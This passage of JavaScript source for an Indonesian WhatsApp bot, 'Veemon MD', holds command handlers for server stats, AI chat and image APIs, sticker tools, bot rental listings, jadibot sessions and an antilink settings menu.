let respon = ` *ᴘ ɪ ɴ ɢ* 
 ${Math.round(neww - oldd)} ms 
 ${latensi.toFixed(4)} ms 

 *ʀ ᴜ ɴ ᴛ ɪ ᴍ ᴇ*
 ${runtime(process.uptime())} 

 *s ᴇ ʀ ᴠ ᴇ ʀ* 
 *🛑 ʀᴀᴍ:* ${formatSize(ramused)} (${persenramm?.toString().split('.')[0]}%) / ${formatSize(totalram)} 
 *🔵 ғʀᴇᴇRAM:* ${formatSize(sisaram)} 
 *🔴 ᴍᴇᴍᴏʀy:* ${ram}
 *🗂 ᴅɪꜱᴋ:* ${formatSize(diskused)} / ${formatSize(totalspace)}
 *📂 ғʀᴇᴇDISK:* ${formatSize(freespace)}
 *🔭 ᴘʟᴀᴛғᴏʀᴍ:* ${os.platform()}
 *🧿 sᴇʀᴠᴇʀ:* ${os.hostname()}
 *📤 ᴜᴘʟᴏᴀᴅ:* ${upload}
 *📥 ᴅᴏᴡɴʟᴏᴀᴅ:* ${download}
 *⏰ ᴛɪᴍᴇ sᴇʀᴠᴇʀ:* ${jam} : ${menit} : ${detik}
 
 *📮 ɴᴏᴅᴇᴊꜱ ᴠᴇʀꜱɪᴏɴ:* ${process.version}
 *💻 ᴄᴘᴜ ᴍᴏᴅᴇʟ:* ${cpuuuu[0].model}
 *📊 ᴏꜱ ᴠᴇʀꜱɪᴏɴ:* ${os.version()}
 
_NodeJS Memory Usaage_
${Object.keys(used)
.map(
(key, _, arr) =>
`${key.padEnd(Math.max(...arr.map((v) => v.length)), " ")}: ${formatp(
used[key],
)}`,
)
.join("\n")}
${readmore}
${cpus[0]
? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times)
.map(
(type) =>
`- *${(type + "*").padEnd(6)}: ${(
(100 * cpu.times[type]) /
cpu.total
).toFixed(2)}%`,
)
.join("\n")}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus
.map(
(cpu, i) =>
`${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(
cpu.times,
)
.map(
(type) =>
`- *${(type + "*").padEnd(6)}: ${(
(100 * cpu.times[type]) /
cpu.total
).toFixed(2)}%`,
)
.join("\n")}`,
)
.join("\n\n")}`
: ""
}
`.trim();
ptz.relayMessage(m?.chat,{
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: respon,
contextInfo: {
mentionedJid: [m?.sender],
externalAdReply: {
showAdAttribution: true
}}}}}}, {})
}
break

case 'dalle': case 'dall-e':
if (!text) return reply("*`masukan query`*\nExample: .dall-e rain")
dallres = `https://widipe.com/v5/text2img?text=${text}`
 ptz.sendMessage(m.chat, {
 image: {url: dallres},
 caption: `${text}`
 },{quoted:fsaluran })
break

case "prompt-gpt": {
if (!text) return reply (`Example : ${prefix + command} buatkan lirik aku lagu Roleplay Hitam gerne Rap|# Lirik Lagu,# Genre: Rap,# Panjang: 14 baris,# Tema: Roleplay Hitam
`)
iniprompt = q.split("|")[0]
initeks = q.split("|")[1]
var js = await fetch(`https://widipe.com/prompt/gpt?prompt=${iniprompt}&text=${initeks}`) 
var json = await js.json()
reply(json.result)
}
break
case "gptgo": {
if (!text) return reply (`*Example : ${prefix + command} Hello*`)
var js = await fetch(`https://widipe.com/gptgo?text=${q}`) 
var json = await js.json()
let que = "`"
reply(`${que}Gpt-Go${que}\n\n ${json.result}`)
}
break

case 'tomp4':
case 'tovideo': {
if (!/webp/.test(mime)) m.reply(`reply stiker dengan caption *${prefix + command}*`)
const webp2mp4File = require("./converter.js")
let media = await ptz.downloadAndSaveMediaMessage(qmsg)
let webpToMp4 = await webp2mp4File(media)
await ptz.sendMessage(m.chat, {
video: {
url: webpToMp4.result,
caption: 'Convert Webp To Video'
}
}, {
quoted:fsaluran
})
await fs.unlinkSync(media)

}
break



case 'bingai': case 'bing-ai': {
if (text === 'loli') {
reply('Pedo lu ?')
} else if (text === 'furry') {
reply('kocak')
} else {
reply('Masukan Query\n\nEdample: .bing-ai Hallo')
}

const bing = await fetchJson(`https://widipe.com/bingai?text=${text}`)
const sult = bing.result
reply(sult)
}
break


case 'tess':
reply('BOT ONLINE')
break

case 'tourl': 
 let media = await ptz.downloadAndSaveMediaMessage(qmsg)
if (!quoted) return reply(`Balas Image Dengan Caption ${prefix + command}`)
let urlgambar = await TelegraPH(media)
let qqq = "`"
reply(`*${qqq}Succes Upload To Telegraph${qqq}*\n\n*Url:* ${urlgambar}\n*Note: No Expire Date*\n\n*Thaks For Using Me !*`)
break

case 'use-power':
let pewer = "*`[ POWER - SELECT ]`*\n\n• .power-energy\n• .power-mahkota\n\n*More ? Coming Soon*"
reply(pewer)
break



case 'nevo':{
if (!text) return reply('Mau Nanya apa emang')
let dataa = await fetchJson(`https://ai.nevolution.team/nevo?apikey=akbarrdev&prompt=${text}`)
let unvo = dataa.response
reply(unvo)
} 
break

case "sewabot": case "sewa": {




const url1 = `https://telegra.ph/file/75c6e28f260ff0a097d51.jpg`;
const url2 = `https://telegra.ph/file/6b6ce5375927b4b248974.jpg`;
const url3 = `https://telegra.ph/file/e06b30b4c26c9990ce948.jpg`;

async function image(url) {
 const { imageMessage } = await generateWAMessageContent({
 image: { url }
 }, {
 upload: ptz.waUploadToServer
 });
 return imageMessage;
}

let msg = generateWAMessageFromContent(
 m.chat,
 {
 viewOnceMessage: {
 message: {
 interactiveMessage: {
 body: { text: `Hai kak ${pushname}, Mau sewa Bot Kami ?, Lihat dan pilih, Klik Link Di bawah foto nya ya` },
 carouselMessage: {
 cards: [
 {
 header: {
 imageMessage: await image(url1),
 hasMediaAttachment: true,
 },
 body: { text: "*- 1 Minggu -*\n• Price: 8k\n• Akses: Premium\n\n• Discount: 5k For Next Buy" },
 nativeFlowMessage: {
 buttons: [
 {
 name: "cta_url",
 buttonParamsJson: '{"display_text":"Sewa","url":"https://wa.me/6283123448708?text=Bang+Mau+Sewa+Bot+Veemon+Md+1+Minggu","webview_presentation":null}',
 },
 ],
 },
 },
 {
 header: {
 imageMessage: await image(url2),
 hasMediaAttachment: true,
 },
 body: { text: "*- 3 Minggu -*\n• Price: 15k\n• Akses: Premium\n\n• Discount: 10k For Next Buy" },
 nativeFlowMessage: {
 buttons: [
 {
 name: "cta_url",
 buttonParamsJson: '{"display_text":"Sewa","url":"https://wa.me/6283123448708?text=Bang+Mau+Sewa+Bot+Veemon+Md+3+Minggu","webview_presentation":null}',
 },
 ],
 },
 },
 {
 header: {
 imageMessage: await image(url3),
 hasMediaAttachment: true,
 },
body: { text: "*- 2 Bulan -*\n• Price: 31k\n• Akses: Premium\n\n• Discount: 24k For Next Buy" },
 nativeFlowMessage: {
 buttons: [
 {
 name: "cta_url",
 buttonParamsJson: '{"display_text":"Sewa","url":"https://wa.me/6283123448708?text=Bang+Mau+Sewa+Bot+Veemon+Md+2+bulan","webview_presentation":null}',
 },
 ],
 },
 },
 
 ],
 messageVersion: 1,
 },
 },
 },
 },
 },
 {}
);

await ptz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id,
});
}
break


case "pin": case "pintesert": {
if (!text) return reply("Masukan Query")
try  {

const res = await (await fetch(`https://widipe.com/pinimg?query=${text}`)).json();

const url1 = `${res.result[1]}`;
const url2 = `${res.result[2]}`;
const url3 = `${res.result[3]}`;
const url4 = `${res.result[4]}`;
const url5 = `${res.result[5]}`;


async function image(url) {
 const { imageMessage } = await generateWAMessageContent({
 image: { url }
 }, {
 upload: ptz.waUploadToServer
 });
 return imageMessage;
}

let msg = generateWAMessageFromContent(
 m.chat,
 {
 viewOnceMessage: {
 message: {
 interactiveMessage: {
 body: { text: `Hai kak ${pushname}, berikut 5 foto dari Pinterest yang anda cari` },
 carouselMessage: {
 cards: [
 {
 header: {
 imageMessage: await image(url1),
 hasMediaAttachment: true,
 },
 body: { text: "Image 1/5" },
 nativeFlowMessage: {
 buttons: [
 {
 name: "cta_url",
 buttonParamsJson: '{"display_text":"CLICK HERE","url":"https://widipe.com","webview_presentation":null}',
 },
 ],
 },
 },
 {
 header: {
 imageMessage: await image(url2),
 hasMediaAttachment: true,
 },
 body: { text: "Image 2/5" },
 nativeFlowMessage: {
 buttons: [
 {
 name: "cta_url",
 buttonParamsJson: '{"display_text":"CLICK HERE","url":"https://widipe.com","webview_presentation":null}',
 },
 ],
 },
 },
 {
 header: {
 imageMessage: await image(url3),
 hasMediaAttachment: true,
 },
 body: { text: "Image 3/5" },
 nativeFlowMessage: {
 buttons: [
 {
 name: "cta_url",
 buttonParamsJson: '{"display_text":"CLICK HERE","url":"https://widipe.com","webview_presentation":null}',
 },
 ],
 },
 },
 {
 header: {
 imageMessage: await image(url4),
 hasMediaAttachment: true,
 },
 body: { text: "Image 4/5" },
 nativeFlowMessage: {
 buttons: [
 {
 name: "cta_url",
 buttonParamsJson: '{"display_text":"CLICK HERE","url":"https://widipe.com","webview_presentation":null}',
 },
 ],
 },
 },
 {
 header: {
 imageMessage: await image(url5),
 hasMediaAttachment: true,
 },
 body: { text: "Image 5/5" },
 nativeFlowMessage: {
 buttons: [
 {
 name: "cta_url",
 buttonParamsJson: '{"display_text":"CLICK HERE","url":"https://widipe.com","webview_presentation":null}',
 },
 ],
 },
 },
 ],
 messageVersion: 1,
 },
 },
 },
 },
 },
 {}
);

await ptz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id,
});
    } catch(e) {
        reply("Cari Yg lain..")
        }
}
break

    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
case 'delcase': {
 if (!isCreator) return reply('Hanya creator yang bisa menghapus case.');
 if (!text) return reply('Mana case yang ingin dihapus?');

 // Nama file yang akan dimodifikasi
 const namaFile = './message.js';

 // Case yang ingin Anda hapus
 const caseToDelete = `case '${text}':`;

 // Baca isi file
 fs.readFile(namaFile, 'utf8', (err, data) => {
 if (err) {
 console.error('Terjadi kesalahan saat membaca file:', err);
 return reply('Terjadi kesalahan saat membaca file.');
 }
const posisiCase = data.indexOf(caseToDelete);
 if (posisiCase === -1) {
 return reply(`Case '${args}' tidak ditemukan dalam file.`);
 }

 // Cari posisi break; berikutnya setelah case
 const posisiBreak = data.indexOf('break;', posisiCase);
 if (posisiBreak === -1) {
 return reply('Tidak dapat menemukan "break;" setelah case yang ingin dihapus.');
 }

 // Potong data untuk menghapus case
 const kodeBaruLengkap = data.slice(0, posisiCase) + data.slice(posisiBreak + 'break;'.length);
fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
 if (err) {
 console.error('Terjadi kesalahan saat menulis file:', err);
 return reply('Terjadi kesalahan saat menulis file.');
 } else {
 return reply(`Case '${text}' berhasil dihapus.`);
 }
 });
 });
    }
 break;
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
 

case 'diffusion':
try {
 const hua = await fetchJson(`https://skizo.tech/api/sdxl?apikey=${global.skizo}&prompt=${text}`)
let huaa = hua.url

ptz.sendMessage(m.chat, {image: huaa, caption: `${text}`},{quoted:fsaluran})
} catch (err) {
reply('Gabisa Jir')
}
break

//=================================================//
   
                
//=================================================//                

case "gpt4": 
if (!text) return reply('Mau Nanya apa bang?')
try {
let cct = await fetchJson(`https://widipe.com/gpt4?text=${text}`)
let resq = cct.result
reply(`${resq}`)
} catch (err) {
m.reply('Website Nya error')
}
break

case 'totalfeature':
 case 'totalfitur': 
 case 'totalcmd': 
 case 'totalcommand': 
reply(`${totalfitur}`)
break

case "diffusion": 
if (!text) return m.reply('Apa ya..')
 const rest = await (await fetch(`https://widipe.com/stablediffusion?text=${text}`))

ptz.sendMessage(m.chat,{image: rest, caption: `${text}`},{quoted:fsaluran})
break

case "tts-anime":
if (!text) return m.reply('Kasih Ejaan Biar Tts nya Ke Arti Soalnya Ga support Indonesia, Contoh: Che-pe-tan pai-mon lah-gee nung-goo nee, mow nah-nya ah-pa ?')

 let restts = await fetchJson(`https://skizo.tech/api/tts-anime?apikey=${global.skizo}&text=${text}&lang=japanese&voice=paimon&speed=0.9&symbol=y`)
let Veemonn = restts.data.url_voice
ptz.sendMessage(m.chat, { audio: { url: Veemonn }, fileName: `tts.mp3`, mimetype: 'audio/mp4' })
break

case 'ss': case 'ssweb':{ 
if (!/^https?:\/\//.test(text)) return reply('Awali *URL* dengan http:// atau https://')

 let tekss99997 = `*Veemon - Multi Device*`
let krt = await ssweb(text)
//throw listMessage.sections[0].rows

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
 	mentionedJid: [m.sender], 
 	isForwarded: false, 
	businessMessageForwardInfo: { businessOwnerJid: ptz.decodeJid(ptz.user.id) },
 externalAdReply: { 
 title: 'Ziyo', 
 thumbnailUrl: 'https://telegra.ph/file/a61add223eb2661c1f38e.jpg', 
 sourceUrl: '',
 mediaType: 2,
 renderLargerThumbnail: false
 }
 }, 
 body: 
proto.Message.InteractiveMessage.Body.create({
 text: tekss99997
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `Success •`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: ``,
 subtitle: "ziyo",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: krt.result }, { upload: ptz.waUploadToServer }))
 }),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [
{
 "name": "cta_copy",
 "buttonParamsJson": "{\"display_text\":\"Copy Url Web\",\"id\":\"123456789\",\"copy_code\":\"Www.Zio-Ganteng.coy.my.id\"}"
 },
 ],
 })
 })
 }
 }
}, {})

await ptz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
}
break

case 'stop-jadibot':
 if (!isPremium) return reply("*`Khusus Prem Saya kak`*")

 const folderPath = `./session2/jadibot/${frommeky}`; 

 if (!fs.existsSync(folderPath)) {
 return reply('Kamu Belum Jadibot');
 }

 try {
 fs.rmSync(folderPath, { recursive: true, force: true });
 reply('Session telah dihapus.');
 } catch (error) {
 m.reply('Error :', error);
 }
 break

 case 'list-jadibot': 
if (!isPremium) return reply("*`Khusus Prem Saya kak`*")
try {
let user = [... new Set([...global.conns.filter(danzz => danzz.user).map(danzz => danzz.user)])]
te = "*-- List Jadibot --*\n\n"
for (let i of user){
y = await ptz.decodeJid(i.id)
te += " •• User : @" + y.split("@")[0] + "\n"
te += " •• Name : " + i.name + "\n\n"
}
ptz.sendMessage(m.chat,{text:te,mentions: [y], },{quoted:m})
} catch (err) {
m.reply(`Belum Ada User Yang Jadibot`)
}
break 

case "start-jadibot":
 if (!isPremium) return reply("*`Khusus Prem Saya kak`*")

try {
let user = [... new Set([...global.conns.filter(danzz => danzz.user).map(danzz => danzz.user)])]
await jadibot(ptz, text, m, frommeky)
} catch (err) {
m.reply(`Belum Ada User Yang Jadibot`)
}
break


case 'toimage': case 'toimg': {

 if (!quoted) reply ('m?.reply Image')
if (!/webp/.test(mime)) reply (`Balas sticker dengan caption *${prefix + command}*`)
let media = await ptz.downloadAndSaveMediaMessage(quoted)
let ran = 'jjsjsnsu.png'
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) reply (err)
let buffer = fs.readFileSync(ran)
ptz.sendMessage(m.chat, { image: buffer }, {quoted:m})
fs.unlinkSync(ran)
})
}
break

case 'kill':case 'pat':case 'lick':case 'bite':case 'yeet':case 'bonk':case 'wink':case 'poke':case 'nom':case 'slap':case 'smile':case 'wave':case 'blush':case 'smug':case 'glomp':case 'happy':case 'dance':case 'cringe':case 'highfive':case 'handhold':
 axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
     ptz.sendImageAsSticker(m.chat, data.url, m, { packname: `${global.packname}`, author: `${global.author}`})
     
     })
break



case 'stickhandhold': {
axios.get(`https://api.waifu.pics/sfw/handhold`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickshinobu': {
axios.get(`https://api.waifu.pics/sfw/shinobu`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhighfive': {
axios.get(`https://api.waifu.pics/sfw/highfive`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickcuddle': {
axios.get(`https://api.waifu.pics/sfw/cuddle`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickcringe': {
axios.get(`https://api.waifu.pics/sfw/cringe`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickdance': {
axios.get(`https://api.waifu.pics/sfw/dance`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhappy': {
axios.get(`https://api.waifu.pics/sfw/happy`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickglomp': {
axios.get(`https://api.waifu.pics/sfw/glomp`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticksmug': {
axios.get(`https://api.waifu.pics/sfw/smug`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickblush': {
axios.get(`https://api.waifu.pics/sfw/blush`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickawoo': {
axios.get(`https://api.waifu.pics/sfw/awoo`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickwave': {
axios.get(`https://api.waifu.pics/sfw/wave`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticksmile': {
axios.get(`https://api.waifu.pics/sfw/smile`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickslap': {
axios.get(`https://api.waifu.pics/sfw/slap`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticknom': {
axios.get(`https://api.waifu.pics/sfw/nom`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickpoke': {
axios.get(`https://api.waifu.pics/sfw/poke`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickwink': {
axios.get(`https://api.waifu.pics/sfw/wink`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickbonk': {
axios.get(`https://api.waifu.pics/sfw/bonk`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickbully': {
axios.get(`https://api.waifu.pics/sfw/bully`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickyeet': {
axios.get(`https://api.waifu.pics/sfw/yeet`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickbite': {
axios.get(`https://api.waifu.pics/sfw/bite`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickkiss': {
axios.get(`https://api.waifu.pics/sfw/kiss`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticklick': {
axios.get(`https://api.waifu.pics/sfw/lick`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickpat': {
axios.get(`https://api.waifu.pics/sfw/pat`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhug': {
axios.get(`https://api.waifu.pics/sfw/hug`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickkill': {
axios.get(`https://api.waifu.pics/sfw/kill`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickcry': {
axios.get(`https://api.waifu.pics/sfw/cry`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickspank':{
                axios.get(`https://nekos.life/api/v2/img/spank`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticktickle':{
                axios.get(`https://nekos.life/api/v2/img/tickle`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break

case 'cekkhodam': case 'cekkodam': {
if (!text) return m.reply("ketik nama mu")
 
	const khodam = pickRandom([
	 "Kaleng Cat Avian",
	 "Pipa Rucika",
     "King Hitam",
     "Lemari dua Pintu",
     "Kacang Hijau",
     "Kulkas mini",
     "Burung beo",
     "Air",
     "Api",
     "Batu",
     "Magnet",
     "Sempak",
	 "Botol Tupperware",
	 "Badut Mixue",
	 "Sabun GIV",
	 "Sandal Swallow",
	 "Jarjit",
	 "Ijat",
	 "Fizi",
	 "Mail",
	 "Ehsan",
	 "Upin",
	 "Ipin",
	 "sungut lele",
	 "Tok Dalang",
	 "Opah",
	 "Opet",
	 "Alul",
	 "Pak Vinsen",
	 "Maman Resing",
	 "Pak RT",
	 "Admin ETI",
	 "Bung Towel",
	 "Lumpia Basah",
     "Bjorka",
     "Hacker",
	 "Martabak Manis",
	 "Baso Tahu",
	 "Tahu Gejrot",
	 "Dimsum",
     "Seblak",
     "Aromanis",
     "Gelembung sabun",
     "Kuda",
	 "Seblak Ceker",
	 "Telor Gulung",
	 "Tahu Aci",
	 "Tempe Mendoan",
	 "Nasi Kucing",
	 "Kue Cubit",
	 "Tahu Sumedang",
	 "Nasi Uduk",
	 "Wedang Ronde",
	 "Kerupuk Udang",
	 "Cilok",
	 "Cilung",
	 "Kue Sus",
	 "Jasuke",
	 "Seblak Makaroni",
	 "Sate Padang",
	 "Sayur Asem",
	 "Kromboloni",
	 "Marmut Pink",
	 "Belalang Mullet",
	 "Kucing Oren",
	 "Lintah Terbang",
	 "Singa Paddle Pop",
	 "Macan Cisewu",
	 "Vario Mber",
	 "Beat Mber",
	 "Supra Geter",
	 "Oli Samping",
	 "Knalpot Racing",
	 "Jus Stroberi",
	 "Jus Alpukat",
	 "Alpukat Kocok",
	 "Es Kopyor",
	 "Es Jeruk",
	 "@whiskeysockets/baileys",
	 "chalk",
	 "gradient-string",
	 "@adiwajshing",
	 "d-scrape",
	 "undefined",
	 "cannot read properties",
	 "performance-now",
    "os",
"node-fetch",
"form-data",
"axios",
"util",
"fs-extra",
"scrape-primbon",
"child_process",
"emoji-regex",
"check-disk-space",
"perf_hooks",
"moment-timezone",
"cheerio",
"fs",
"process",
"require( . . . )",
"import ... from ...",
"rate-overlimit",
	 "Cappucino Cincau",
	 "Jasjus Melon",
	 "Teajus Apel",
	 "Pop ice Mangga",
	 "Teajus Gulabatu",
	 "Air Selokan",
	 "Air Kobokan",
	 "TV Tabung",
	 "Keran Air",
	 "Tutup Panci",
	 "Kotak Amal",
	 "Tutup Termos",
	 "Tutup Botol",
	 "Kresek Item",
	 "Kepala Casan",
	 "Ban Serep",
	 "Kursi Lipat",
	 "Kursi Goyang",
	 "Kulit Pisang",
	 "Warung Madura",
	 "Gorong-gorong",
	])
 
	const response = `Khodam: ${khodam}\n <!> Jangan lupa di tap-tap`
 
	m.reply(response)
 }
break

case 'antilink': case 'antimenu': case 'antilinkmenu':
if (!isGroup) return
try {
 let sections = [{
		title: '- Anti Menu Selection -', 
		rows: [{
	 title: 'Antilink All [ ON ]',
 	description: `<!> Enable Feature •`, 
 	id: `${prefix}antilinkall on`
 }, 
{
 title: 'Antilink All [ OFF ]',
 description: "<!> Disable Feature",
 id: `${prefix}antilinkall off`
 },
 {
 title: 'Antilink Group [ ON ]',
 description: "<!> Enable Feature",
 id: `${prefix}antilinkgc on`
 },
 {
 title: 'Antilink Group [ OFF ]',
 description: "<!> Disable Feature",
 id: `${prefix}antilinkgc off`
 },
 {
 title: 'Antilink Wa.me [ ON ]',
 description: "<!> Enable Feature",
 id: `${prefix}antiwame on`
 },
 {
 title: 'Antilink Wa.me [ OFF ]',
 description: "<!> Disable Feature",
 id: `${prefix}antiwame off`
 },
 {
 title: 'Antilink Facebook [ ON ]',
 description: "<!> Display All Tools Feature",
 id: `${prefix}antilinkfb on`
 },
 {
 title: 'Antilink Facebook [ OFF ]',
 description: "<!> Disable Feature",
 id: `${prefix}antilinkfb off`
 },
 {
 title: 'Antilink Tiktok [ ON ]',
 description: "<!> Enable Feature",
 id: `${prefix}antilinktt on`
 },
 {
 title: 'Antilink Tiktok [ OFF ]',
 description: "<!> Disable Feature",
 id: `${prefix}antilinktt off`
 },
 {
 title: 'Antilink Telegram [ ON ]',
 description: "<!> Enable Feature",
 id: `${prefix}antilinktele on`
 },
 {
 title: 'Antilink Telegram [ OFF ]',
 description: "<!> Disable Feature",
 id: `${prefix}antilinktele off`
 }, 
 {
 title: 'Antilink Twiter [ ON ]',
 description: "<!> Enable Feature",
 id: `${prefix}antilinktwit on`
 }, 
 {
 title: 'Antilink Twiter [ OFF ]',
 description: "<!> Disable Feature",
 id: `${prefix}antilinktwit off`
 },
 {
 title: 'Antilink Yt vid [ ON ]',
 description: "<!> Enable Feature",
 id: `${prefix}antilinkytvid on`
 }, 
 {
 title: 'Antilink Yt Vid [ OFF ]',
 description: "<!> Disable Feature",
 id: `${prefix}antilinkytvid off`
 },
 {
 title: 'Antilink Yt ch [ ON ]',
 description: "<!> Enable Feature",
 id: `${prefix}antilinkytch on`
 }, 
 {
 title: 'Antilink Yt ch [ OFF ]',
 description: "<!> Disable Feature",
 id: `${prefix}antilinkytch off`
 }]
}]

let listMessage = {
 title: "Selection",
 sections
};

let msghhhhhhhhhhhhhhhhhhhk = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m?.sender],
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '12036326753195844@newsletter',
 newsletterName: `Veemon Md • ${runtime(process.uptime())}`,
 serverMessageId: -1
 },
 businessMessageForwardInfo: {
 businessOwnerJid: ptz.decodeJid(ptz.user.id)
 },
 externalAdReply: {
 title: '⟡V E E M O N • M U L T I - D E V I C E⟡',
 body: "x ᴛʜᴇᴍᴇ ᴅɪɢɪ ᴇᴠᴏ - ᴠᴇʀ",
 thumbnailUrl: "https://telegra.ph/file/f81f19a203231c4f2bf29.jpg",
 sourceUrl: '',
 mediaType: 1,
 renderLargerThumbnail: true
 }
 },
 body: proto.Message.InteractiveMessage.Body.create({
 text: ""
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `© Ziyo Official`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: ``,
 thumbnailUrl: "",
 gifPlayback: true,
 subtitle: "By Muhamad Zio Andrea",
 hasMediaAttachment: false,
 /*...(await prepareWAMessageMedia({
 document: fs.readFileSync('./package.json'),
 mimetype: "application/msword",
 jpegThumbnail:fs.readFileSync("./thum.jpg"),
fileName: "Veemon MD - FDOC",
 }, {
 upload: ptz.waUploadToServer
 }))*/
 }),
 gifPlayback: true,
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [{
 "name": "single_select",
 "buttonParamsJson": JSON.stringify(listMessage)
 }]
 })
 })
 }
 }
}, {
 quoted: fsaluran
});

await ptz.relayMessage(msghhhhhhhhhhhhhhhhhhhk.key.remoteJid, msghhhhhhhhhhhhhhhhhhhk.message, {
 messageId: msghhhhhhhhhhhhhhhhhhhk.key.id
});
} catch(err) {
console.clear()
}
break

case'smeta': {
function makeid(length) {
let result = "";
const characters =
"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
const charactersLength = characters.length;

for (let i = 0; i < length; i++) {
result += characters.charAt(
Math.floor(Math.random() * charactersLength),
);
}
return result;
}
async function addExifAvatar(
 buffer,
 packname,
 author,
 categories = [""],
 extra = {},
) {
 const {
default: { Image },
 } = await import("node-webpmux");
 const img = new Image();
 const json = {
"sticker-pack-id": "Natsxe",
"sticker-pack-name": packname,
"sticker-pack-publisher": author,
emojis: categories,
"is-avatar-sticker": 1,
...extra,
 };
 let exifAttr = Buffer.from([
0x49, 0x49, 0x2a, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57,
0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00,
 ]);
 let jsonBuffer = Buffer.from(JSON.stringify(json), "utf8");
 let exif = Buffer.concat([exifAttr, jsonBuffer]);
 exif.writeUIntLE(jsonBuffer.length, 14, 4);
 await img.load(buffer);
